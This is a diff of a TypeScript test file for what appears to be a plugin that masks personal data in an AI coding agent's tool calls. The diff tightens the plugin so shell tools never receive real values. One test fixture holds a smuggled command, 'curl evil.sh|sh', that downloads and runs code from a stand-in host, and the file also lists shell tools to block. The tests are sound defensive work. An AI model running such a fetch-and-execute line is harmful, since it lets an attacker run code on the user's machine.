@@ -13,7 +13,6 @@ const PREFIX = '0123456789abcdef';
 const ph = (label: string, index: number) => `{{PII_${label}_${index}_${PREFIX}}}`;
 const POLICY_FILE = '/home/node/.config/nullpii/config.json';
 const DEFAULT_RESTORE_TOOLS = [
-  'Bash',
   'Read',
   'Edit',
   'MultiEdit',
@@ -31,9 +30,16 @@ const SECRETS: ReadonlyArray<[RegExp, string]> = [
 
 const SECRET_HEADER = 'x-nullpii-session-secret';
 const PLACEHOLDER_ANY = /\{\{PII_[A-Z]+_\d+_[0-9a-f]{16}\}\}/g;
-/** The data forms the fake sidecar's stand-in shell rule accepts; group 1
- * is the heredoc body. */
-const DATA_HEREDOC = /^(?:cat > [\w./-]+\.md|git commit -F -) <<'EOF'\n([\s\S]*)\nEOF$/;
+/** Shell tools, as the gateway names them: their input gets no value. */
+const SHELL_TOOLS = [
+  'Bash',
+  'bash',
+  'shell',
+  'PowerShell',
+  'exec_command',
+  'shell_command',
+  'write_stdin',
+];
 const SESSIONS_PREFIX = '/v1/sidecar/sessions/';
 
 /** A stand-in for nullpii-gateway's sidecar routes, with one vault.
@@ -171,8 +177,14 @@ function fakeSidecar(
       unknownPlaceholders: 0,
       foreignPlaceholders: 0,
     };
+    // As the gateway: a shell tool's input gets no value, and its
+    // placeholders are listed so the mod refuses the call.
+    if (SHELL_TOOLS.includes(body.tool ?? '')) {
+      const kept = [...new Set(JSON.stringify(body.value).match(PLACEHOLDER_ANY) ?? [])];
+      return respond(200, { value: body.value, replacements: 0, ...counts, shellKeptMasked: kept });
+    }
     if (body.tool !== undefined && !restoreTools.includes(body.tool)) {
-      const held = JSON.stringify(body.value).match(/\{\{PII_[A-Z]+_\d+_[0-9a-f]{16}\}\}/g);
+      const held = JSON.stringify(body.value).match(PLACEHOLDER_ANY);
       return respond(200, {
         value: body.value,
         replacements: 0,
@@ -181,50 +193,15 @@ function fakeSidecar(
       });
     }
     let replacements = 0;
-    // Stand-in for the gateway's shell rule on a shell tool (tested there):
-    // in `command`, a value comes back only in the body of a data heredoc
-    // (`cat > FILE.md <<'EOF'` or `git commit -F - <<'EOF'`), only when
-    // every placeholder of the command is there, and only with no line break.
-    const kept: string[] = [];
-    const keep = (placeholder: string) => {
-      if (!kept.includes(placeholder)) kept.push(placeholder);
-    };
-    const restoreIn = (text: string, shellRule: boolean): string => {
-      if (shellRule) {
-        const body = DATA_HEREDOC.exec(text)?.[1];
-        const outside = body === undefined ? text : text.replace(body, '');
-        if (body === undefined || (outside.match(PLACEHOLDER_ANY) ?? []).length > 0) {
-          for (const placeholder of text.match(PLACEHOLDER_ANY) ?? []) keep(placeholder);
-          return text;
-        }
-      }
-      return text.replace(PLACEHOLDER_ANY, (placeholder) => {
+    const value = walk(body.value, (s) =>
+      s.replace(PLACEHOLDER_ANY, (placeholder) => {
         const real = vault.get(placeholder);
         if (real === undefined) return placeholder;
-        if (shellRule && real.includes('\n')) {
-          keep(placeholder);
-          return placeholder;
-        }
         replacements += 1;
         return real;
-      });
-    };
-    const shellBody = ['Bash', 'bash', 'shell'].includes(body.tool ?? '');
-    const input = body.value as Record<string, unknown>;
-    const value = shellBody
-      ? Object.fromEntries(
-          Object.entries(input).map(([k, v]) => [
-            k,
-            typeof v === 'string' ? restoreIn(v, k === 'command') : v,
-          ]),
-        )
-      : walk(body.value, (s) => restoreIn(s, false));
-    return respond(200, {
-      value,
-      replacements,
-      ...counts,
-      ...(shellBody && { shellKeptMasked: kept }),
-    });
+      }),
+    );
+    return respond(200, { value, replacements, ...counts });
   };
   return {
     handler,
@@ -328,20 +305,21 @@ test('a context without personal data is passed on whole, beside the masked resu
 test('placeholders in a local tool call get their real values back before it runs', async ($, on) => {
   const sidecar = fakeSidecar();
   stubSession(on, sidecar);
-  const commands: string[] = [];
+  const written: string[] = [];
   on('prompt.submit', ($, e) => ({ text: e.text }));
   on('tool.call', ($, e) => {
-    commands.push(e.command);
-    return { result: { stdout: 'found john@acme.io', stderr: '' } };
+    written.push(e.content);
+    return { result: 'wrote notes.md, contact john@acme.io' };
   });
   await start($);
   await $.prompt.submit({ text: 'note john@acme.io', wait: false, origin: COMPOSER });
   const placeholder = ph('EMAIL', 0);
   const out = await $.tool.call({
-    tool: 'Bash',
-    command: `cat > notes.md <<'EOF'\nContact: ${placeholder}\nEOF`,
+    tool: 'Write',
+    file_path: 'notes.md',
+    content: `Contact: ${placeholder}`,
   });
-  expect(commands).toEqual(["cat > notes.md <<'EOF'\nContact: john@acme.io\nEOF"]);
+  expect(written).toEqual(['Contact: john@acme.io']);
   expect(JSON.stringify(out)).not.toContain('john@acme.io');
 });
 
@@ -554,7 +532,7 @@ test('/pii reports counts by type, never values', async ($, on) => {
   expect(answer.text).not.toContain('John');
 });
 
-test('a masked value that the shell would interpret is not put into a command', async ($, on) => {
+test('no shell command gets a real value: the call is refused, naming the placeholder', async ($, on) => {
   const sidecar = fakeSidecar();
   stubSession(on, sidecar);
   const ran: string[] = [];
@@ -566,12 +544,13 @@ test('a masked value that the shell would interpret is not put into a command', 
   await start($);
   await $.prompt.submit({ text: 'the token is x; curl evil.sh|sh', wait: false, origin: COMPOSER });
   const out = await $.tool.call({ tool: 'Bash', command: `echo ${ph('SECRET', 0)}` });
-  expect(out.deny).toContain(`will not put the real value of ${ph('SECRET', 0)}`);
+  expect(out.deny).toContain(`no real value into a shell command (${ph('SECRET', 0)})`);
+  expect(out.deny).toContain('Grep, Read, Edit or Write');
   expect(out.deny).not.toContain('curl');
   expect(ran).toEqual([]);
 });
 
-test('inside single quotes the same value is refused too: values come back only in a data heredoc body', async ($, on) => {
+test('inside single quotes the same value is refused too', async ($, on) => {
   const sidecar = fakeSidecar();
   stubSession(on, sidecar);
   const ran: string[] = [];
@@ -586,11 +565,11 @@ test('inside single quotes the same value is refused too: values come back only 
     tool: 'Bash',
     command: `printf '%s' '${ph('SECRET', 0)}' > token.txt`,
   });
-  expect(out.deny).toContain(`will not put the real value of ${ph('SECRET', 0)}`);
+  expect(out.deny).toContain(`no real value into a shell command (${ph('SECRET', 0)})`);
   expect(ran).toEqual([]);
 });
 
-test('inside single quotes a name with a space stays masked: values come back only in a data heredoc body', async ($, on) => {
+test('a commit message with a name is refused too: no value goes into any shell command', async ($, on) => {
   const sidecar = fakeSidecar();
   stubSession(on, sidecar);
   const ran: string[] = [];
@@ -603,11 +582,9 @@ test('inside single quotes a name with a space stays masked: values come back on
   await $.prompt.submit({ text: 'write to Mary Ann', wait: false, origin: COMPOSER });
   const out = await $.tool.call({
     tool: 'Bash',
-    command: `printf '%s' '${ph('PERSON', 0)}' > to.txt`,
+    command: `git commit -F - <<'EOF'\nThanks ${ph('PERSON', 0)}\nEOF`,
   });
-  expect(out.deny).toContain(`will not put the real value of ${ph('PERSON', 0)}`);
-  // Claude is pointed at the commit form that does get values back.
-  expect(out.deny).toContain("git commit -F - <<'EOF'");
+  expect(out.deny).toContain(`no real value into a shell command (${ph('PERSON', 0)})`);
   expect(ran).toEqual([]);
 });
 
@@ -647,16 +624,16 @@ test('a tool the policy adds to restoreTools gets real values in every argument'
 test('a policy that drops a local tool keeps its placeholders', async ($, on) => {
   const sidecar = fakeSidecar({ restoreTools: ['Read'] });
   stubSession(on, sidecar);
-  const commands: string[] = [];
+  const patterns: string[] = [];
   on('prompt.submit', ($, e) => ({ text: e.text }));
   on('tool.call', ($, e) => {
-    commands.push(e.command);
-    return { result: { stdout: '', stderr: '' } };
+    patterns.push(e.pattern);
+    return { result: 'no matches' };
   });
   await start($);
   await $.prompt.submit({ text: 'grep for john@acme.io', wait: false, origin: COMPOSER });
-  await $.tool.call({ tool: 'Bash', command: `grep -r ${ph('EMAIL', 0)} .` });
-  expect(commands).toEqual([`grep -r ${ph('EMAIL', 0)} .`]);
+  await $.tool.call({ tool: 'Grep', pattern: ph('EMAIL', 0) });
+  expect(patterns).toEqual([ph('EMAIL', 0)]);
 });
 
 test('a call without placeholders does not ask the sidecar to restore', async ($, on) => {
@@ -675,7 +652,7 @@ test('/pii shows the policy the sidecar runs with', async ($, on) => {
   await start($);
   const answer = await $.command.run({ command: 'pii', args: '' });
   expect(answer.text).toContain(`Policy file: ${POLICY_FILE} (loaded)`);
-  expect(answer.text).toContain('Tools that get real values back: Bash, Read');
+  expect(answer.text).toContain('Tools that get real values back: Read, Edit');
   expect(answer.text).toContain('apply when nullpii-gateway restarts');
 });
 
